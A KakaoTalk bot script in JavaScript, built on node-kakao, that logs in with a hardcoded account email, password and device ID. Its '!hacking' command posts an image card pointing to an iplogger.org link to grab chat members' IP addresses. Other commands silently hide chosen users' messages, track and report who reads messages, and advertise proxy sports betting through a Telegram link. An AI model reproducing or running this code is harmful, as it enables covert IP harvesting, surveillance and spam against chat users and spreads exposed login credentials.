const node_kakao = require("node-kakao");
const email = "greenbe0821@kakao.com";
const pw = "dlaekdhs0821";
const deviceUUID = "ffNT/jAZKks8lIHuKdIQy5TO6RkMCTSATk1VYPTKTgYr48i1AnFCyYGBOOzWE7pTT6RWyi84AQiYk4Ttvsf5Bf==";
const deviceNAME = "DAON-KAKAO";
let client = new node_kakao.TalkClient(deviceNAME, deviceUUID, { version: "3.2.9", appVersion: "3.2.9.2815", xvcSeedList: ["KEPHA", "HALEY"] });
var iskeyIssued = false;
var key;
var master = [];
var admin = [];
var selroom= ["0000"]; //방id
//특정 방만 작동하는 코드
//" && selroom.includes(roomId)
var readMessage = {};
var Detect = {};
var Hider = {};
var record = {};
var messages = {};


client.login(email, pw, true).then(function () {
    master.push("308650291");
    console.log("[DAON KAKAO]");
    console.log("[Log - login] 로그인에 성공했습니다.");
}).catch(function (error) {
    if (error.status === -100) {
        const readLine = require("readline");
        const rl = readLine.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        client.Auth.requestPasscode(email, pw);
        rl.question("PASSCODE: ", function (answer) {
            client.Auth.registerDevice(answer, email, pw, true).then(function (res) {
                console.log(res);
                console.log("스크립트를 재 시작 해주세요.");
                process.exit();
            });
        });
    } else {
        console.log(JSON.stringify(error, null, 2));
    }
});

sendimti = function(chat, num) {
    chat.Channel.sendTemplate(new node_kakao.AttachmentTemplate(new node_kakao.EmoticonAniAttachment('(이모티콘)', num + '.emot_001.webp', undefined, undefined, undefined, '120', '120', '카카오 이모티콘')));
}

client.on("message", function (chat) {
    let userInfo = chat.Channel.getUserInfo(chat.Sender);
    if (!userInfo) return;
    let keyreal = Math.random().toString(36).slice(2, 15);
    let id = String(chat.sender.id);
    let skname = String(chat.sender.nickname);
    let spro = String(chat.sender.originalProfileImageUrl);
    let roomId = String(chat.channel.dataStruct.channelId);
    if(!Hider[roomId]) Hider[roomId] = [];
    if(!messages[roomId]) messages[roomId] = [];
    messages[roomId].push(String(chat.logId));
    if(Hider[roomId].includes(id)) client.OpenLinkManager.hideChat(chat.channel, chat.logId);
    if (chat.Text == "_id") chat.replyText('', new node_kakao.ChatMention(userInfo), "님의 ID :\n", id);
    if (chat.Text == "_roomid" && master.includes(id)) chat.replyText(roomId);
    if (chat.Text == "_key") {
        key = ("DAON_" + keyreal)
        iskeyIssued = true;
        chat.replyText('', new node_kakao.ChatMention(userInfo), '님은\n', key, ' 를 입력하여\n관리자 등록을 완료해주세요.');
    }
    if(chat.Text == key && iskeyIssued) {
        key = null;
        iskeyIssued = false;
        admin.push(id);
        chat.replyText('', new node_kakao.ChatMention(userInfo), "님,\n관리자에 등록되었습니다.");
    }
if(chat.Text == "!hacking" && master.includes(id)) {
            var value = Math.floor(Math.random() * 1);
            switch(value) {
              case 0 :
         sendAny(chat, "https://iplogger.org/21Amh3");
             break;
         }
        }
         function sendAny(chat, link) {
            client.chatManager.sendRaw(chat.channel,23,'IP-HACKING',{
               "L": "",
               "Q": "GRAB-HACKING",
               "V": "image",
               "R": [
                {
               "D": "GRAB-HACKING",
               "L": "",
               "I": link,
               "W": "800",
               "H": "800",
                }
               ]
            })}
if (chat.Text.startsWith("!프사 ") && master.includes(id)) { 
        let text = chat.Text.slice(4);
        let attach = {"L": "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl="+encodeURI(text),"Q": text,"V": "image","R": [{"D": text,"L": "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl="+encodeURI(text),"I": "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl="+encodeURI(text),"W": 800,"H": 800}]};
        client.chatManager.sendRaw(chat.channel,23,text,attach);
    }

if (chat.Text.startsWith("!대리토토") && master.includes(id)) { 
    { 
client.chatManager.sendRaw(chat.channel,23,'Search', 
        { 
            "L": "", 
            "Q": "대리토토", 
            "V": "brand", 
            "R": [ 
            { 
            "D": "", 
            "L": "", 
            "DE": "", 
            "I": "https://ifh.cc/g/l0Bded.png", 
            "T": "대리토토 문의하기", 
            } 
                ], 
                "F": 
               { 
                   "BU":  
                   [ 
                      { 
                         "T": "구매문의", 
                         "L": "https://t.me/hypp00lly" 
                      } 
                   ] 
                } 
            } 
        ) 
     } 
     }
if(chat.Text.startsWith("!임티보내") && master.includes(id)) {
var c = chat.Text.substr(6,7);
var d = chat.Text.substr(14,19);
chat.delete();
client.chatManager.sendRaw(chat.channel,25,'',{
"name":"(이모티콘)",
"url": c+".emot_"+d+".webp",
"type":"image/webp",
"width":1000,
"height":280,
"xconVersion":1,
"s":0,
"alt":"카카오 이모티콘"
})
}
    if(chat.Text.startsWith("!감지") && master.includes(id)){
        var _Mention = getMention(chat);
        if(!_Mention) {
            CaroSel(chat, [{text : "!감지 @멘션 의 형태로 써주세요."}]);
        } else {
            if(!Detect[roomId]) Detect[roomId] = [];
            if(Detect[roomId].includes(String(_Mention))) {
                chat.replyText("해당 유저는 이미 감지중입니다.");
            } else {
                chat.replyText(chat.channel.getUserInfoId(String(_Mention)).memberStruct.nickname + "님을 감지합니다.");
                Detect[roomId].push(String(_Mention));
            }
        }
    }
    if(chat.Text == "!읽은사람" && chat.Type == 26 && master.includes(id)) {
        if(!readMessage[roomId]) {
            chat.replyText("99명이 넘는 방에서는 해당 기능을 사용하실 수 없습니다.");
        } else {
            var r = readMessage[roomId][chat.attachmentList[0].SourceLogId];
            if(!r || r.length == 0) {
                chat.replyText("기록된 읽은 사람이 없습니다.");
            } else {
                chat.replyText("읽은 사람의 목록입니다.\n\n", "" + r.join("\n"));
            }
        }
    }

});

function getMention(chat) {
    var zr = chat.getMentionContentList();
    if(!zr[0]) {
        return null;
    }
    return zr[0].UserId;
}

client.on("message_read", function(channel, reader, logId){
    if(readMessage[channel.id] === undefined) readMessage[channel.id] = {}; //채널 긁어오기
    if(readMessage[channel.Id][logId] === undefined) readMessage[channel.Id][logId] = []; //메시지 별로 배열 선언하기
    if(!Detect[channel.id]) Detect[channel.id] = [];
    if(!record[channel.id]) record[channel.id] = [];
    var usinfo = channel.getUserInfo(reader); //userInfo
    if(!usinfo) return;
    if(!usinfo.memberStruct) return;
    if(!record[channel.id].includes(logId)) record[channel.id].push(logId);
    if(Object.keys(readMessage[channel.id]).length >= 50) {
        delete readMessage[channel.id][Object.keys(readMessage[channel.id])[0]];
    }
    try {
        for(var j in Detect[channel.id]) {
            if(Detect[channel.id][j] == String(usinfo.memberStruct.userId)) {
                channel.sendText(new node_kakao.ChatMention(usinfo), "님이 읽었습니다.");
                var _index = Detect[channel.id].indexOf(String(usinfo.memberStruct.userId))
                Detect[channel.id].splice(_index, 1);
            }
        }
    } catch (e) {}
    Object.keys(readMessage[channel.id]).map(e => {
        try {
            if(!readMessage[channel.id][e].includes(usinfo.memberStruct.nickname)) { //각 메시지에 읽음목록 추가
                readMessage[channel.Id][e].push(String(usinfo.memberStruct.nickname)); //위와같음
            }
        } catch (e) {
            console.log("readMessage 오류가 발생하였습니다.\n" + e.stack);
        }
    });
})

var info = new node_kakao.CustomInfo (
    "방폭 ㅅㄱ 아무것도 못하쥬?",
    "plusfriend_bot",
    "https://naver.com",
    "6.4.5",
    "6.4.5",
    "2.6.1",
    "2.3.5",
    undefined,
    undefined,
    undefined,
    undefined,
    false, // Link
    true, // BigChat
    false, // Sercure
    false, // KakaoVerifed (카카오 뱃지)
    true, // CanForward
    true, // Ref
    true // Ad
)


